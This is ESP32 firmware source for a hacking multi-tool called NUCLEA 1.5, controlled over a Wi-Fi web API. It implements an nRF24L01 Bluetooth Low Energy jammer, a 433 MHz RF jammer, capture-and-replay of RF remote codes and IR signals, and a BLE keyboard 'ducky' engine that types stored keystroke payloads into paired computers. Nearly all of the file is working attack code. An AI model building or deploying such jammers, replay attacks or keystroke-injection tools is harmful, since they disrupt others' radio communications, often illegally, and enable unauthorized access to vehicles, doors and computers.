// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  NUCLEA 1.5 — ESP32 Firmware                                                ║
// ║  RF 433 MHz  •  IR 38 kHz  •  BLE HID Ducky  •  nRF24L01 BLE Jammer   ║
// ╚══════════════════════════════════════════════════════════════════════════╝
//
//  nRF24L01+ wiring (default VSPI):
//    CE   → GPIO 22
//    CSN  → GPIO 21
//    SCK  → GPIO 18  (VSPI SCK)
//    MOSI → GPIO 23  (VSPI MOSI)
//    MISO → GPIO 19  (VSPI MISO)
//    VCC  → 3.3 V     GND → GND
//
//  BLE Jammer floods the three BLE advertising channels (37,38,39) with
//  maximum‑power noise packets at 2 Mbps. Auto‑stops after 60 seconds.
//  (To jam all 40 BLE channels, uncomment #define JAM_ALL_40_CHANNELS)
//
//  Endpoints:
//    GET /ble/jam/start   → start jammer
//    GET /ble/jam/stop    → stop jammer
//    GET /ble/jam/status  → JSON {active, elapsed, nrfReady, packets}
//
//  All other RF/IR/BT endpoints unchanged.
// ─────────────────────────────────────────────────────────────────────────────

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <RCSwitch.h>
#include <IRremoteESP8266.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>
#include <SPI.h>
#include <RF24.h>
#include <BleKeyboard.h>

// ── WiFi Config ──────────────────────────────────────────────────────────────
const char* ssid     = "NUCLEA_AP";
const char* password = "nuclea123";

WebServer server(80);
RCSwitch   rfSwitch = RCSwitch();

// ── Pin Definitions ──────────────────────────────────────────────────────────
#define RF_RX_PIN    4
#define RF_TX_PIN    5
#define RF_JAM_PIN   25
#define IR_RX_PIN    15
#define IR_TX_PIN    2

// ── nRF24L01 pins ────────────────────────────────────────────────────────────
#define NRF_CE_PIN   22
#define NRF_CSN_PIN  21

RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);

// ── IR Setup ─────────────────────────────────────────────────────────────────
IRrecv irrecv(IR_RX_PIN);
IRsend irsend(IR_TX_PIN);
decode_results irResults;

// ── BLE HID Keyboard ─────────────────────────────────────────────────────────
BleKeyboard bleKeyboard("NUCLEA HID", "NUCLEA", 100);

// ── Save Slot Structures ─────────────────────────────────────────────────────
#define NUM_SLOTS 4

struct RFSlot {
  unsigned long value    = 0;
  unsigned int  bits     = 0;
  unsigned int  protocol = 0;
  unsigned int  pulseLen = 0;
  char          label[20] = "";
  bool          hasData  = false;
};

struct IRSlot {
  uint64_t      code     = 0;
  decode_type_t protocol = UNKNOWN;
  uint16_t      bits     = 0;
  char          label[20] = "";
  bool          hasData  = false;
};

#define NUM_BT_SLOTS    4
#define BT_PAYLOAD_MAX  512

struct BTSlot {
  char  payload[BT_PAYLOAD_MAX] = "";
  char  label[20]               = "";
  bool  hasData                 = false;
};

RFSlot rfSlots[NUM_SLOTS];
IRSlot irSlots[NUM_SLOTS];
BTSlot btSlots[NUM_BT_SLOTS];

int activeRFSlot = 0;
int activeIRSlot = 0;
int activeBTSlot = 0;

bool isBleEnabled = false;
bool isJamming = false;
unsigned long jamStartTime = 0;

// ── nRF24 BLE Jammer State ───────────────────────────────────────────────────
bool    isBleJamming = false;
bool    nrfReady     = false;
unsigned long bleJamStart = 0;
#define BLE_JAM_MAX_MS  60000UL

// Correct BLE channel → nRF24 channel mapping:
// BLE RF frequency = 2402 + 2 * BLE_channel (MHz)
// nRF24 channel   = RF_freq - 2400
// => nRF24_channel = 2 + 2 * BLE_channel
//
// For advertising channels:
//   37 → 2402 MHz → nRF24 channel 2
//   38 → 2426 MHz → nRF24 channel 26
//   39 → 2480 MHz → nRF24 channel 80
#ifdef JAM_ALL_40_CHANNELS
  static const uint8_t BLE_CHANNELS[] = {
     0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,17,18,19,
    20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39
  };
  static const uint8_t BLE_CHAN_COUNT = 40;
#else
  // Jam only the three advertising channels (most effective)
  static const uint8_t BLE_CHANNELS[] = {37, 38, 39};
  static const uint8_t BLE_CHAN_COUNT = 3;
#endif

static uint8_t nrf24Channels[BLE_CHAN_COUNT];
uint8_t bleJamChanIdx = 0;
uint32_t bleJamPacketCount = 0;
unsigned long lastBleJamMillis = 0;

// ── CORS ─────────────────────────────────────────────────────────────────────
void addCORS() {
  server.sendHeader("Access-Control-Allow-Origin",  "*");
  server.sendHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
}

int getSlotParam(int maxSlots) {
  if (server.hasArg("slot")) {
    int s = server.arg("slot").toInt();
    if (s >= 0 && s < maxSlots) return s;
  }
  return 0;
}

// ════════════════════════════════════════════════════════════════════════════
//  nRF24 BLE JAMMER — Fixed channel mapping & reliable packet bursts
// ════════════════════════════════════════════════════════════════════════════

bool initNRF24() {
  // DO NOT call SPI.begin() here — RF24 library already does it internally
  if (!radio.begin()) {
    Serial.println("[NRF] ERROR: nRF24L01 not detected — check wiring");
    return false;
  }
  // Aggressive jammer configuration
  radio.setPALevel(RF24_PA_MAX);      // maximum TX power
  radio.setDataRate(RF24_2MBPS);      // 2 Mbps for wider spectral occupancy
  radio.setAutoAck(false);            // no ACKs
  radio.disableCRC();                 // no CRC
  radio.setRetries(0, 0);             // no retransmissions
  radio.setPayloadSize(32);           // maximum payload bytes
  radio.stopListening();
  // Dummy pipe address
  uint8_t addr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};
  radio.openWritingPipe(addr);
  
  // Pre‑compute nRF24 channels from BLE channel numbers
  for (int i = 0; i < BLE_CHAN_COUNT; i++) {
    nrf24Channels[i] = 2 + 2 * BLE_CHANNELS[i];  // correct mapping
  }
  
  // Test transmission
  uint8_t testPayload[32];
  memset(testPayload, 0xFF, 32);
  radio.write(&testPayload, 32);
  
  Serial.println("[NRF] nRF24L01 ready — BLE jammer active (advertising channels only)");
  return true;
}

void bleJamStartFlood() {
  if (!nrfReady) return;
  isBleJamming = true;
  bleJamStart = millis();
  bleJamChanIdx = 0;
  bleJamPacketCount = 0;
  lastBleJamMillis = 0;
  Serial.println("[NRF] BLE jammer started — flooding advertising channels");
}

void bleJamStop() {
  isBleJamming = false;
  radio.stopListening();
  Serial.println("[NRF] BLE jammer stopped");
}

void bleJamLoop() {
  if (!isBleJamming || !nrfReady) return;

  // Safety auto‑stop
  if (millis() - bleJamStart > BLE_JAM_MAX_MS) {
    bleJamStop();
    Serial.println("[NRF] BLE jam auto‑stopped (60 s limit)");
    return;
  }

  // Flood each channel for ~3 ms (BLE connection slots are 1.25 ms)
  unsigned long now = millis();
  if (now - lastBleJamMillis >= 3) {
    // Switch to next BLE channel
    uint8_t ch = nrf24Channels[bleJamChanIdx % BLE_CHAN_COUNT];
    bleJamChanIdx++;
    radio.setChannel(ch);
    
    // Send as many packets as possible in ~3 ms
    uint8_t payload[32];
    memset(payload, 0xFF, 32);
    unsigned long startMicro = micros();
    while (micros() - startMicro < 3000) {  // 3 ms burst
      if (!radio.writeFast(&payload, 32)) {
        radio.txStandBy();   // flush failed packets to prevent lock‑up
      }
      bleJamPacketCount++;
    }
    radio.txStandBy();       // final flush before channel switch
    lastBleJamMillis = now;
  }
}

// ════════════════════════════════════════════════════════════════════════════
//  HTTP Handlers for BLE Jammer
// ════════════════════════════════════════════════════════════════════════════
void handleBleJamStart() {
  addCORS();
  if (!nrfReady) {
    server.send(503, "text/plain", "NRF24_NOT_READY");
    return;
  }
  if (!isBleJamming) {
    bleJamStartFlood();
    server.send(200, "text/plain", "BLE_JAM_STARTED");
  } else {
    server.send(200, "text/plain", "ALREADY_JAMMING");
  }
}

void handleBleJamStop() {
  addCORS();
  if (isBleJamming) bleJamStop();
  server.send(200, "text/plain", "BLE_JAM_STOPPED");
}

void handleBleJamStatus() {
  addCORS();
  unsigned long elapsed = isBleJamming ? (millis() - bleJamStart) / 1000 : 0;
  String json = "{\"active\":" + String(isBleJamming ? "true" : "false")
              + ",\"elapsed\":" + String(elapsed)
              + ",\"nrfReady\":" + String(nrfReady ? "true" : "false")
              + ",\"packets\":" + String(bleJamPacketCount) + "}";
  server.send(200, "application/json", json);
}

// ════════════════════════════════════════════════════════════════════════════
//  RF 433 MHz HANDLERS (unchanged)
// ════════════════════════════════════════════════════════════════════════════
void handleRFRead() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  activeRFSlot = slot;
  rfSwitch.disableTransmit();
  rfSwitch.enableReceive(RF_RX_PIN);
  server.send(200, "text/plain", "RECORDING");
  unsigned long start = millis();
  while (millis() - start < 10000) {
    if (rfSwitch.available()) {
      rfSlots[slot].value    = rfSwitch.getReceivedValue();
      rfSlots[slot].bits     = rfSwitch.getReceivedBitlength();
      rfSlots[slot].protocol = rfSwitch.getReceivedProtocol();
      rfSlots[slot].pulseLen = rfSwitch.getReceivedDelay();
      rfSlots[slot].hasData  = (rfSlots[slot].value != 0);
      rfSwitch.resetAvailable();
      break;
    }
    delay(10);
  }
  rfSwitch.disableReceive();
  Serial.printf("[RF] Slot %d → Value:%lu Bits:%d Proto:%d\n",
    slot, rfSlots[slot].value, rfSlots[slot].bits, rfSlots[slot].protocol);
}

void handleRFEmulate() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  if (!rfSlots[slot].hasData) { server.send(400, "text/plain", "NO_RF_SIGNAL_IN_SLOT"); return; }
  rfSwitch.disableReceive();
  rfSwitch.enableTransmit(RF_TX_PIN);
  rfSwitch.setProtocol(rfSlots[slot].protocol);
  rfSwitch.setPulseLength(rfSlots[slot].pulseLen);
  rfSwitch.setRepeatTransmit(15);
  rfSwitch.send(rfSlots[slot].value, rfSlots[slot].bits);
  rfSwitch.disableTransmit();
  server.send(200, "text/plain", "RF_REPLAYED");
  Serial.printf("[RF] Replayed slot %d\n", slot);
}

void handleRFLabel() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  if (server.hasArg("name")) server.arg("name").toCharArray(rfSlots[slot].label, sizeof(rfSlots[slot].label));
  server.send(200, "text/plain", "OK");
}

void handleRFClear() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  rfSlots[slot] = RFSlot();
  server.send(200, "text/plain", "CLEARED");
}

// ════════════════════════════════════════════════════════════════════════════
//  RF 433 MHz JAMMER
// ════════════════════════════════════════════════════════════════════════════
void handleJamStart() {
  addCORS();
  if (!isJamming) {
    isJamming = true; jamStartTime = millis();
    rfSwitch.disableReceive(); rfSwitch.enableTransmit(RF_JAM_PIN);
    Serial.println("[JAM] 433 MHz jam STARTED");
  }
  server.send(200, "text/plain", "JAM_STARTED");
}

void handleJamStop() {
  addCORS();
  isJamming = false; rfSwitch.disableTransmit();
  server.send(200, "text/plain", "JAM_STOPPED");
  Serial.println("[JAM] 433 MHz jam STOPPED");
}

void jamLoop() {
  if (!isJamming) return;
  if (millis() - jamStartTime > 30000) {
    isJamming = false; rfSwitch.disableTransmit();
    Serial.println("[JAM] Auto-stopped (30 s limit)"); return;
  }
  for (int p = 1; p <= 12; p++) {
    rfSwitch.setProtocol(p);
    rfSwitch.send(0xAAAAAAAA, 32);
    rfSwitch.send(0x55555555, 32);
    delayMicroseconds(400);
  }
}

// ════════════════════════════════════════════════════════════════════════════
//  INFRARED HANDLERS
// ════════════════════════════════════════════════════════════════════════════
void handleIRRead() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  activeIRSlot = slot;
  irrecv.resume();
  unsigned long start = millis();
  while (millis() - start < 6000) {
    if (irrecv.decode(&irResults)) {
      irSlots[slot].code     = irResults.value;
      irSlots[slot].protocol = irResults.decode_type;
      irSlots[slot].bits     = irResults.bits;
      irSlots[slot].hasData  = (irSlots[slot].code != 0);
      String json = "{\"success\":true,\"slot\":" + String(slot)
                  + ",\"code\":\""     + uint64ToString(irSlots[slot].code)  + "\""
                  + ",\"protocol\":\"" + typeToString(irSlots[slot].protocol, true) + "\""
                  + ",\"bits\":"       + String(irSlots[slot].bits) + "}";
      server.send(200, "application/json", json);
      irrecv.resume();
      return;
    }
    delay(10);
  }
  server.send(408, "text/plain", "IR_TIMEOUT");
}

void handleIREmulate() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  if (!irSlots[slot].hasData) { server.send(400, "text/plain", "NO_IR_SIGNAL_IN_SLOT"); return; }
  irsend.send(irSlots[slot].protocol, irSlots[slot].code, irSlots[slot].bits);
  server.send(200, "text/plain", "IR_EMULATED");
}

void handleIRLabel() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  if (server.hasArg("name")) server.arg("name").toCharArray(irSlots[slot].label, sizeof(irSlots[slot].label));
  server.send(200, "text/plain", "OK");
}

void handleIRClear() {
  addCORS();
  int slot = getSlotParam(NUM_SLOTS);
  irSlots[slot] = IRSlot();
  server.send(200, "text/plain", "CLEARED");
}

// ════════════════════════════════════════════════════════════════════════════
//  BLE DUCKY HELPERS (unchanged)
// ════════════════════════════════════════════════════════════════════════════
uint8_t resolveSpecialKey(const String& token) {
  if (token == "ENTER")     return KEY_RETURN;
  if (token == "TAB")       return KEY_TAB;
  if (token == "SPACE")     return ' ';
  if (token == "BACKSPACE") return KEY_BACKSPACE;
  if (token == "DELETE")    return KEY_DELETE;
  if (token == "ESC")       return KEY_ESC;
  if (token == "UP")        return KEY_UP_ARROW;
  if (token == "DOWN")      return KEY_DOWN_ARROW;
  if (token == "LEFT")      return KEY_LEFT_ARROW;
  if (token == "RIGHT")     return KEY_RIGHT_ARROW;
  if (token == "HOME")      return KEY_HOME;
  if (token == "END")       return KEY_END;
  if (token == "PGUP")      return KEY_PAGE_UP;
  if (token == "PGDN")      return KEY_PAGE_DOWN;
  if (token == "F1")        return KEY_F1;
  if (token == "F2")        return KEY_F2;
  if (token == "F3")        return KEY_F3;
  if (token == "F4")        return KEY_F4;
  if (token == "F5")        return KEY_F5;
  if (token == "F6")        return KEY_F6;
  if (token == "F7")        return KEY_F7;
  if (token == "F8")        return KEY_F8;
  if (token == "F9")        return KEY_F9;
  if (token == "F10")       return KEY_F10;
  if (token == "F11")       return KEY_F11;
  if (token == "F12")       return KEY_F12;
  if (token == "WIN")       return KEY_LEFT_GUI;
  if (token == "ALT")       return KEY_LEFT_ALT;
  if (token == "CTRL")      return KEY_LEFT_CTRL;
  if (token == "SHIFT")     return KEY_LEFT_SHIFT;
  if (token == "CAPSLOCK")  return KEY_CAPS_LOCK;
  return 0;
}

void executeBTPayload(const char* raw) {
  if (!isBleEnabled || !bleKeyboard.isConnected()) {
    Serial.println("[BT] BLE off or not connected — payload aborted");
    return;
  }
  String text = String(raw);
  int len = text.length();
  int i = 0;
  while (i < len) {
    if (i + 1 < len && text[i] == '<' && text[i+1] == '<') {
      int end = text.indexOf(">>", i + 2);
      if (end == -1) { bleKeyboard.print(text[i]); i++; continue; }
      String token = text.substring(i + 2, end);
      i = end + 2;
      if (token.startsWith("DELAY:")) {
        int ms = token.substring(6).toInt();
        delay(ms > 5000 ? 5000 : ms);
        continue;
      }
      uint8_t modifiers[4] = {0,0,0,0};
      int modCount = 0;
      uint8_t mainKey = 0;
      String t = token;
      while (true) {
        int plus = t.indexOf('+');
        String part = (plus == -1) ? t : t.substring(0, plus);
        part.trim();
        if (part == "CTRL")       modifiers[modCount++] = KEY_LEFT_CTRL;
        else if (part == "ALT")   modifiers[modCount++] = KEY_LEFT_ALT;
        else if (part == "SHIFT") modifiers[modCount++] = KEY_LEFT_SHIFT;
        else if (part == "WIN")   modifiers[modCount++] = KEY_LEFT_GUI;
        else {
          uint8_t special = resolveSpecialKey(part);
          if (special)              mainKey = special;
          else if (part.length()==1) mainKey = (uint8_t)part[0];
        }
        if (plus == -1) break;
        t = t.substring(plus + 1);
      }
      bleKeyboard.press(mainKey);
      for (int m=0; m<modCount; m++) bleKeyboard.press(modifiers[m]);
      delay(50);
      bleKeyboard.releaseAll();
      delay(30);
    } else if (text[i] == '\n') {
      bleKeyboard.press(KEY_RETURN); delay(30); bleKeyboard.releaseAll(); i++;
    } else {
      bleKeyboard.print(text[i]); i++;
    }
    delay(20);
  }
  Serial.println("[BT] Payload executed");
}

// ════════════════════════════════════════════════════════════════════════════
//  BLE HID HTTP HANDLERS
// ════════════════════════════════════════════════════════════════════════════
void handleBTOn() {
  addCORS();
  if (!isBleEnabled) { isBleEnabled = true; bleKeyboard.begin(); Serial.println("[BT] BLE ON"); }
  server.send(200, "text/plain", "BLE_ON");
}

void handleBTOff() {
  addCORS();
  if (isBleEnabled) { isBleEnabled = false; bleKeyboard.end(); Serial.println("[BT] BLE OFF"); }
  server.send(200, "text/plain", "BLE_OFF");
}

void handleBTStatus() {
  addCORS();
  String json = "{";
  json += "\"enabled\":"   + String(isBleEnabled ? "true" : "false") + ",";
  json += "\"connected\":" + String(bleKeyboard.isConnected() ? "true" : "false") + ",";
  json += "\"activeBTSlot\":" + String(activeBTSlot) + ",";
  json += "\"btSlots\":[";
  for (int i=0; i<NUM_BT_SLOTS; i++) {
    json += "{\"hasData\":" + String(btSlots[i].hasData ? "true" : "false")
         + ",\"label\":\""  + String(btSlots[i].label) + "\""
         + ",\"preview\":\"" + String(btSlots[i].payload).substring(0,60) + "\"}";
    if (i<NUM_BT_SLOTS-1) json += ",";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

void handleBTSet() {
  addCORS();
  int slot = getSlotParam(NUM_BT_SLOTS);
  if (!server.hasArg("payload")) { server.send(400, "text/plain", "MISSING_PAYLOAD"); return; }
  String p = server.arg("payload");
  if (p.length() >= BT_PAYLOAD_MAX) p = p.substring(0, BT_PAYLOAD_MAX-1);
  p.toCharArray(btSlots[slot].payload, sizeof(btSlots[slot].payload));
  btSlots[slot].hasData = (p.length() > 0);
  server.send(200, "text/plain", "BT_PAYLOAD_SAVED");
}

void handleBTExec() {
  addCORS();
  int slot = getSlotParam(NUM_BT_SLOTS);
  activeBTSlot = slot;
  if (!btSlots[slot].hasData)        { server.send(400, "text/plain", "NO_BT_PAYLOAD_IN_SLOT"); return; }
  if (!isBleEnabled)                 { server.send(503, "text/plain", "BLE_DISABLED"); return; }
  if (!bleKeyboard.isConnected())    { server.send(503, "text/plain", "BT_NOT_CONNECTED"); return; }
  server.send(200, "text/plain", "BT_EXEC_STARTED");
  executeBTPayload(btSlots[slot].payload);
}

void handleBTType() {
  addCORS();
  if (!isBleEnabled)             { server.send(503, "text/plain", "BLE_DISABLED"); return; }
  if (!bleKeyboard.isConnected()){ server.send(503, "text/plain", "BT_NOT_CONNECTED"); return; }
  if (!server.hasArg("text"))    { server.send(400, "text/plain", "MISSING_TEXT"); return; }
  String text = server.arg("text");
  server.send(200, "text/plain", "TYPING");
  bleKeyboard.print(text);
}

void handleBTKey() {
  addCORS();
  if (!isBleEnabled)             { server.send(503, "text/plain", "BLE_DISABLED"); return; }
  if (!bleKeyboard.isConnected()){ server.send(503, "text/plain", "BT_NOT_CONNECTED"); return; }
  if (!server.hasArg("k"))       { server.send(400, "text/plain", "MISSING_K"); return; }
  String combo = "<<" + server.arg("k") + ">>";
  server.send(200, "text/plain", "KEY_SENT");
  executeBTPayload(combo.c_str());
}

void handleBTLabel() {
  addCORS();
  int slot = getSlotParam(NUM_BT_SLOTS);
  if (server.hasArg("name")) server.arg("name").toCharArray(btSlots[slot].label, sizeof(btSlots[slot].label));
  server.send(200, "text/plain", "OK");
}

void handleBTClear() {
  addCORS();
  int slot = getSlotParam(NUM_BT_SLOTS);
  btSlots[slot] = BTSlot();
  server.send(200, "text/plain", "CLEARED");
}

// ════════════════════════════════════════════════════════════════════════════
//  GLOBAL STATUS
// ════════════════════════════════════════════════════════════════════════════
void handleStatus() {
  addCORS();
  String json = "{";
  json += "\"jamming\":"       + String(isJamming ? "true" : "false") + ",";
  json += "\"bleJamming\":"    + String(isBleJamming ? "true" : "false") + ",";
  json += "\"nrfReady\":"      + String(nrfReady ? "true" : "false") + ",";
  json += "\"activeRFSlot\":"  + String(activeRFSlot) + ",";
  json += "\"activeIRSlot\":"  + String(activeIRSlot) + ",";
  json += "\"activeBTSlot\":"  + String(activeBTSlot) + ",";
  json += "\"btConnected\":"   + String(bleKeyboard.isConnected() ? "true" : "false") + ",";
  json += "\"bleEnabled\":"    + String(isBleEnabled ? "true" : "false") + ",";
  json += "\"rfSlots\":[";
  for (int i=0; i<NUM_SLOTS; i++) {
    json += "{\"hasData\":" + String(rfSlots[i].hasData ? "true" : "false")
         + ",\"value\":" + String(rfSlots[i].value)
         + ",\"bits\":" + String(rfSlots[i].bits)
         + ",\"protocol\":" + String(rfSlots[i].protocol)
         + ",\"pulseLen\":" + String(rfSlots[i].pulseLen)
         + ",\"label\":\"" + String(rfSlots[i].label) + "\"}";
    if (i<NUM_SLOTS-1) json += ",";
  }
  json += "],\"irSlots\":[";
  for (int i=0; i<NUM_SLOTS; i++) {
    json += "{\"hasData\":" + String(irSlots[i].hasData ? "true" : "false")
         + ",\"code\":\"" + uint64ToString(irSlots[i].code) + "\""
         + ",\"protocol\":\"" + typeToString(irSlots[i].protocol, true) + "\""
         + ",\"bits\":" + String(irSlots[i].bits)
         + ",\"label\":\"" + String(irSlots[i].label) + "\"}";
    if (i<NUM_SLOTS-1) json += ",";
  }
  json += "],\"btSlots\":[";
  for (int i=0; i<NUM_BT_SLOTS; i++) {
    json += "{\"hasData\":" + String(btSlots[i].hasData ? "true" : "false")
         + ",\"label\":\"" + String(btSlots[i].label) + "\""
         + ",\"preview\":\"" + String(btSlots[i].payload).substring(0,60) + "\"}";
    if (i<NUM_BT_SLOTS-1) json += ",";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

// ════════════════════════════════════════════════════════════════════════════
//  SETUP & LOOP
// ════════════════════════════════════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  delay(1000);

  // Init slot labels
  for (int i=0; i<NUM_SLOTS; i++) {
    snprintf(rfSlots[i].label, sizeof(rfSlots[i].label), "SLOT %d", i+1);
    snprintf(irSlots[i].label, sizeof(irSlots[i].label), "SLOT %d", i+1);
  }
  for (int i=0; i<NUM_BT_SLOTS; i++)
    snprintf(btSlots[i].label, sizeof(btSlots[i].label), "BT SLOT %d", i+1);

  // GPIO
  pinMode(RF_RX_PIN, INPUT);
  pinMode(RF_TX_PIN, OUTPUT);
  pinMode(RF_JAM_PIN, OUTPUT);
  pinMode(IR_TX_PIN, OUTPUT);
  digitalWrite(RF_TX_PIN, LOW);
  digitalWrite(RF_JAM_PIN, LOW);

  // IR & RF
  irrecv.enableIRIn();
  irsend.begin();
  rfSwitch.enableReceive(RF_RX_PIN);

  // nRF24
  nrfReady = initNRF24();

  // BLE HID
  Serial.println("[BT] BLE HID ready (OFF) — call /bt/on to enable");

  // WiFi AP
  WiFi.softAP(ssid, password);
  Serial.print("NUCLEA AP IP: ");
  Serial.println(WiFi.softAPIP());

  // Routes
  server.on("/status",          HTTP_GET, handleStatus);
  server.on("/rf/read",         HTTP_GET, handleRFRead);
  server.on("/rf/emulate",      HTTP_GET, handleRFEmulate);
  server.on("/rf/label",        HTTP_GET, handleRFLabel);
  server.on("/rf/clear",        HTTP_GET, handleRFClear);
  server.on("/rf/jam/start",    HTTP_GET, handleJamStart);
  server.on("/rf/jam/stop",     HTTP_GET, handleJamStop);
  server.on("/ir/read",         HTTP_GET, handleIRRead);
  server.on("/ir/emulate",      HTTP_GET, handleIREmulate);
  server.on("/ir/label",        HTTP_GET, handleIRLabel);
  server.on("/ir/clear",        HTTP_GET, handleIRClear);
  server.on("/bt/on",           HTTP_GET, handleBTOn);
  server.on("/bt/off",          HTTP_GET, handleBTOff);
  server.on("/bt/status",       HTTP_GET, handleBTStatus);
  server.on("/bt/set",          HTTP_GET, handleBTSet);
  server.on("/bt/exec",         HTTP_GET, handleBTExec);
  server.on("/bt/type",         HTTP_GET, handleBTType);
  server.on("/bt/key",          HTTP_GET, handleBTKey);
  server.on("/bt/label",        HTTP_GET, handleBTLabel);
  server.on("/bt/clear",        HTTP_GET, handleBTClear);
  server.on("/ble/jam/start",   HTTP_GET, handleBleJamStart);
  server.on("/ble/jam/stop",    HTTP_GET, handleBleJamStop);
  server.on("/ble/jam/status",  HTTP_GET, handleBleJamStatus);
  server.onNotFound([]() { addCORS(); server.send(204); });

  server.begin();
  Serial.println("NUCLEA Ready!");
}

void loop() {
  server.handleClient();
  jamLoop();       // 433 MHz jammer
  bleJamLoop();    // nRF24 BLE jammer
  delay(1);
}